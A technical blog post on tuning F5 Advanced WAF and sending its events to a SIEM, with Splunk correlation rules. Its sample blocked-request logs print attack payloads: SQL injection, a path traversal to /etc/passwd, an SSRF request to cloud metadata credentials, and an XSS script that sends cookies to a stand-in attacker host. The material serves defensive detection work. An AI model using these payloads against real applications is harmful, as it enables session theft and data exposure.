---
title: "F5 Advanced WAF: Top Attacks, Tuning, and SIEM-Based Detection"
description: "A practical guide to F5 Advanced WAF covering the OWASP Top 10 attack patterns it faces, how to tune it without drowning in false positives, and how to pipe its events into a SIEM and actually use them."
pubDate: "Oct 26 2026"
tags: ["WAF", "F5", "appsec", "SIEM", "incident response", "OWASP", "web security"]
---

F5 Advanced WAF (the product formerly known as BIG-IP ASM) sits between your users and your application and makes a binary call on every HTTP request. That sounds simple. In practice, a freshly deployed WAF in blocking mode will break your application within minutes if you haven't tuned it, and a WAF left in transparent mode for six months because nobody had time to tune it is a logging service with marketing copy. This post covers the attack surface it's designed to stop, how to build a policy that actually blocks things without constant false positives, and how to feed its events into a SIEM in a way that generates actionable signal rather than noise.

If you haven't read [WAF Layer 5 vs Layer 7](/blog/waf-layer-5-vs-layer-7/), that post covers why inspection depth determines what a WAF can and can't see. F5 Advanced WAF operates at Layer 7, meaning it terminates TLS, reassembles streams, and parses HTTP before making decisions.

## The Attack Surface

### SQL Injection

Still the most common web application attack and still surprisingly effective against applications that haven't parameterised their queries. The payload hides in any user-controlled input: GET parameters, POST bodies, JSON fields, cookie values, HTTP headers like `X-Forwarded-For` that get logged and queried.

```
# F5 ASM violation log: SQL injection in POST body

2026-10-26T03:14:22Z  BLOCK
  src_ip=198.51.100.44  src_port=54801
  method=POST  uri=/api/v1/users/search
  violation=VIOL_PARAMETER_VALUE_ATTACK
  attack_type=SQL_INJECTION
  sig_id=200002147
  sig_name="SQL injection attempt: boolean-based blind"
  parameter=query
  payload=admin' AND 1=1--
  severity=Critical  policy=prod-api-policy
```

F5 maintains signature sets covering union-based, boolean-based, error-based, and time-based blind injection. The signature update frequency matters here: a campaign using a novel encoding (double-URL encoding, Unicode bypass, comment insertion) may not match an existing signature. The behavioral anomaly engine is what catches the gaps.

### Cross-Site Scripting

XSS lives at the intersection of injection and browser trust. Reflected XSS puts the payload in a URL parameter that gets echoed into a response. Stored XSS writes it to a database where it executes for every future visitor. DOM-based XSS never hits the server at all, which means a WAF operating on server responses can't catch it. F5 handles reflected and stored XSS but cannot inspect client-side JavaScript execution.

```
# F5 ASM violation log: XSS in query parameter

2026-10-26T04:02:51Z  BLOCK
  src_ip=203.0.113.9  src_port=61002
  method=GET  uri=/search?q=<script>fetch('https://evil.invalid/c?c='+document.cookie)</script>
  violation=VIOL_PARAMETER_VALUE_ATTACK
  attack_type=XSS
  sig_id=200101032
  sig_name="XSS: script tag with event handler"
  parameter=q
  severity=High  policy=prod-web-policy
```

### Command Injection and Path Traversal

Command injection targets server-side execution: a user input that ends up in a shell command, a filename lookup, or a subprocess call. Path traversal uses `../` sequences to escape the intended directory scope and read arbitrary files.

```
# Path traversal via decoded URI

2026-10-26T04:17:03Z  BLOCK
  src_ip=203.0.113.44  src_port=49211
  method=GET  uri=/download?file=../../../../etc/passwd
  violation=VIOL_PARAMETER_VALUE_ATTACK  VIOL_EVASION
  attack_type=PATH_TRAVERSAL
  evasion=DECODED_ELEMENT_ATTACK  (double URL-encoded: %252e%252e%252f)
  sig_name="Path traversal: dot-dot-slash sequences"
  severity=Critical  policy=prod-api-policy
```

Note the `VIOL_EVASION` here. F5 specifically flags when an attacker is using encoding to try to bypass signature matching. That flag is worth correlating on in your SIEM because it indicates intent, not just a malformed request.

### SSRF

Server-Side Request Forgery turns your server into a proxy. The attacker supplies a URL and your application fetches it, potentially hitting internal services, cloud metadata endpoints (`169.254.169.254`), or internal API gateways that aren't exposed externally.

```
# SSRF attempt targeting AWS metadata

2026-10-26T05:01:12Z  BLOCK
  src_ip=198.51.100.83  src_port=55001
  method=POST  uri=/api/v2/webhooks
  violation=VIOL_PARAMETER_VALUE_ATTACK
  attack_type=SERVER_SIDE_REQUEST_FORGERY
  parameter=callback_url
  payload=http://169.254.169.254/latest/meta-data/iam/security-credentials/
  severity=Critical  policy=prod-api-policy
```

F5's SSRF detection relies on pattern matching against known metadata service ranges and loopback addresses. Custom signatures covering your internal IP ranges are worth adding because F5 doesn't know your network topology.

### API Abuse and Parameter Tampering

This one is less about signatures and more about schema enforcement. A REST API that accepts `{"role":"user"}` at account creation should reject `{"role":"admin"}`. A numeric ID field should reject negative numbers, UUIDs, and SQL fragments. F5 Advanced WAF's parameter learning and JSON schema validation handle this, but only if you've defined what valid looks like.

```json
// F5 parameter definition for a numeric user ID field
{
  "name": "user_id",
  "type": "integer",
  "minimum": 1,
  "maximum": 9999999,
  "allow_empty": false,
  "meta_characters": "none"
}
```

Without this kind of definition, the WAF will pass `user_id=-1 UNION SELECT ...` because it looks like a normal request.

### HTTP Request Smuggling

Request smuggling exploits inconsistency between how a front-end (load balancer or CDN) and a back-end parse `Content-Length` and `Transfer-Encoding: chunked` headers in the same request. It can be used to poison the request queue and hijack another user's session or bypass WAF inspection entirely. F5 detects the most common variants (CL-TE, TE-CL) but detection here depends on whether F5 is the termination point or a pass-through.

## Tuning: Not Drowning in False Positives

### Start in Transparent Mode, Build Baselines

Deploy with the policy in transparent mode for two to four weeks. F5's learning engine (Traffic Learning in the UI, policy builder in older firmware) observes real traffic and suggests what to allow. It classifies requests by URL, parameter name, and value type. After the learning period you review the suggestions and accept or reject them before flipping to blocking.

The alternative, starting in blocking mode, will generate calls from the application team within the hour because legitimate POST bodies often trigger SQL signatures, JavaScript-heavy applications throw XSS alerts, and anything doing file uploads will hit size violation rules.

```
# BIG-IP tmsh commands for policy mode management

# Check current enforcement mode
tmsh show asm policy | grep -E "Enforcement Mode|Policy Name"

# Set a named policy to transparent (review traffic without blocking)
tmsh modify asm policy /Common/prod-api-policy active

# Export current learning suggestions for review
tmsh list asm policy /Common/prod-api-policy suggestions
```

### Handling False Positives

False positives fall into two categories: signatures that match legitimate traffic, and parameter definitions that are too strict. The process for each is different.

**Signature false positive:** A CMS editor sending HTML in a POST body will match XSS signatures constantly. The correct fix is to create a parameter-level signature exception for that specific parameter on that specific URL, not to globally disable the XSS signature set.

```
# F5 signature exception: disable XSS checks on the body_content parameter
# at /admin/posts/edit only, not globally

URL: /admin/posts/edit
Parameter: body_content
Disable signatures: XSS signatures (signature set: "Cross-Site Scripting Signatures")
Reason: Rich text editor sends raw HTML; XSS is enforced by output encoding at render time
```

**Parameter definition false positive:** A UUID field treated as a string will throw character set violations if the WAF expects alphanumeric only. Define the parameter explicitly with the correct type and character set.

### Evasion Detection Settings

F5 has a category of violations specifically for evasion techniques: double encoding, null bytes, path traversal normalisation, and so on. These should almost always remain enabled because legitimate traffic almost never double-encodes characters. A request that triggers `VIOL_EVASION` alongside a `VIOL_PARAMETER_VALUE_ATTACK` is more likely a real attack than a false positive.

```
# Key evasion detection settings to verify are enabled

tmsh list asm policy /Common/prod-api-policy general | grep -E "evasion|decode"

# Expected output includes:
# evasion-techniques-enabled yes
# decode-all-requests yes
```

### Bot Detection and Rate Limiting

Advanced WAF includes bot signature detection and a JavaScript challenge mechanism. Bots that can't execute JavaScript (most scrapers, scanners, and credential-stuffing tooling) fail the challenge and are blocked or rate-limited. Legitimate browsers pass silently.

Rate limiting is per-URI, not just per-IP. A single IP sending 2 requests per second to `/api/v1/login` looks different in your logs than 2000 IPs each sending 1 request per second. F5's DoS profiles handle both, but the thresholds need tuning to your actual traffic baseline.

## Detection and Response

### Violation Severity and Action Mapping

F5 assigns violations a severity. How you respond to each level should be defined upfront, not improvised per-incident.

| Severity | Typical Violations | Default Response | Recommended Response |
|---|---|---|---|
| Critical | SQLi, Command Injection, Path Traversal | Block request | Block + alert SIEM + 24h IP block |
| High | XSS, XXE, SSRF | Block request | Block + alert SIEM |
| Medium | Parameter violations, bot detection | Block or CAPTCHA | CAPTCHA challenge + log |
| Low | Encoding anomalies alone | Log | Log + correlate in SIEM |
| Informational | Policy learning suggestions | Log | Review periodically |

The 24-hour IP block for critical violations is debatable. If the attacker is using rotating residential proxies it doesn't help. If they're using a fixed IP or a small subnet, it buys time. The decision is policy, not technical.

### Incident Response Workflow

When a Critical alert fires:

1. Check `src_ip` against threat intelligence: is this a known scanner (Shodan, Censys, commercial vuln scanner) or something novel?
2. Check the URI: is the attacker targeting a real endpoint or scanning for paths that don't exist?
3. Check violation diversity: is it a single signature hit or multiple attack types from the same IP? Multiple types suggest active enumeration.
4. Check timing: isolated burst or sustained campaign?

```
# Quick triage: pull all violations from one src_ip in the last hour
# via F5 REST API

curl -sk -u admin:$PASSWORD \
  "https://bigip.internal/mgmt/tm/asm/events/requests?\$filter=src_ip eq '198.51.100.44' and date_time gt '$(date -u -d '1 hour ago' +%Y-%m-%dT%H:%M:%SZ)'" \
  | python3 -m json.tool \
  | grep -E '"attack_type"|"sig_name"|"uri"|"date_time"'
```

## SIEM Integration

### Syslog Configuration

F5 forwards ASM events via syslog. Configure a logging profile that sends to your SIEM collector at CEF or key-value format. CEF is preferable because most SIEMs parse it natively.

```
# Create a remote logging destination (Splunk/QRadar/Elastic receiver)
tmsh create sys log-config destination remote-high-speed-log \
  siem-asm-dest { pool-name siem-pool protocol udp }

# Create a publisher
tmsh create sys log-config publisher asm-siem-publisher {
  destinations add { siem-asm-dest }
}

# Create an ASM logging profile pointing at the publisher
tmsh create asm log-profile siem-asm-profile {
  application add {
    siem-asm-log {
      filter { request-type all }
      storage-format cef
      remote-storage remote
      remote-storage-publisher asm-siem-publisher
    }
  }
}
```

### Key Fields to Index

Not every field in a WAF event is worth indexing in your SIEM. The ones that matter for detection and investigation:

| Field | Why It Matters |
|---|---|
| `src_ip` | Primary correlation key for threat intel lookups |
| `attack_type` | Grouping for alert logic |
| `sig_id` / `sig_name` | Signature-level triage |
| `uri` | Identify targeted endpoints |
| `method` | POST-heavy scans behave differently from GET scans |
| `parameter` | Which input is being attacked |
| `violation_rating` | F5's risk score (0-5); correlate with severity |
| `response_code` | Was the request blocked or did it reach the app? |
| `x_forwarded_for` | True source IP if behind another proxy |

### SIEM Correlation Rules

These are the rules worth building, in rough priority order.

**Rule 1: Critical violation from IP not previously seen**
```
# Splunk SPL

index=waf sourcetype=f5:asm severity=Critical
| eval first_seen=if(isnull(first_seen), _time, first_seen)
| stats min(_time) as first_seen count as hit_count by src_ip
| where first_seen > relative_time(now(), "-1h")
| join src_ip [ search index=waf sourcetype=f5:asm | stats count by src_ip | where count > 0 ]
| where hit_count >= 3
| table src_ip first_seen hit_count
```

**Rule 2: Single IP hitting multiple attack types (scanner/active exploitation)**
```
# Splunk SPL

index=waf sourcetype=f5:asm
| stats dc(attack_type) as unique_attacks count as total_hits by src_ip
| where unique_attacks >= 3 AND total_hits >= 10
| sort -unique_attacks
```

**Rule 3: WAF bypass attempt (evasion violation)**
```
# Alert when VIOL_EVASION fires alongside any attack violation

index=waf sourcetype=f5:asm violation_name=VIOL_EVASION
| join src_ip uri [
    search index=waf sourcetype=f5:asm violation_name!=VIOL_EVASION severity=Critical
  ]
| stats count by src_ip uri attack_type
```

**Rule 4: Attacks reaching the application (response_code != 403)**

This one matters most. If F5 is in transparent mode, or a violation was below the blocking threshold, the request gets through. Correlating WAF events with application logs where the response code was 200 or 500 identifies attacks that weren't stopped.

```
# Splunk SPL: WAF-detected attack that got a 200 response

index=waf sourcetype=f5:asm severity IN (Critical, High) response_code=200
| stats count by src_ip attack_type uri
| sort -count
```

A 500 response after a SQLi hit is worth investigating immediately: it may indicate the injection hit a real query and caused an error, not a clean block.

**Rule 5: Account takeover / credential stuffing via login endpoint**
```
# High request volume to login endpoint from distributed IPs (low-and-slow ATO)

index=waf sourcetype=f5:asm uri="/api/v1/auth/login" method=POST
| bin _time span=5m
| stats dc(src_ip) as unique_ips count as req_count by _time
| where unique_ips > 50 AND req_count > 200
```

### Responding to SIEM Alerts

SIEM alerts from WAF events should route to one of three outcomes:

1. **False positive:** log it, create a tuning ticket, do not page anyone at 3am for a scanner hitting `/admin` on an endpoint that returns 404
2. **True positive, blocked:** document in the incident log, check if the same IP is in threat intel, close
3. **True positive, reached the application:** this is your incident response trigger. Pull application logs, check whether the attack succeeded, scope the blast radius

The WAF event tells you what was attempted. The application logs tell you whether it worked. Both are required for a complete picture. A WAF that fires alerts nobody correlates against app-layer results is contributing noise, not security.

## A Note on F5 Versions

BIG-IP Advanced WAF is the product name for versions 16.x and later. Earlier versions use the ASM module name. The management API endpoints, log formats, and some tmsh paths differ between major versions. The configuration logic above applies to 17.x; 15.x and 16.x use identical concepts with slightly different command paths in places. If you're still on 14.x, the signature update mechanism and REST API coverage are materially different and the upgrade case is strong.

The core principle stays constant across versions: a WAF is a decision point, not a passive inspector. What you do with the decisions, how you tune the policy, and how you correlate the output in a SIEM is what separates a WAF that stops attacks from one that generates a dashboard nobody reads.
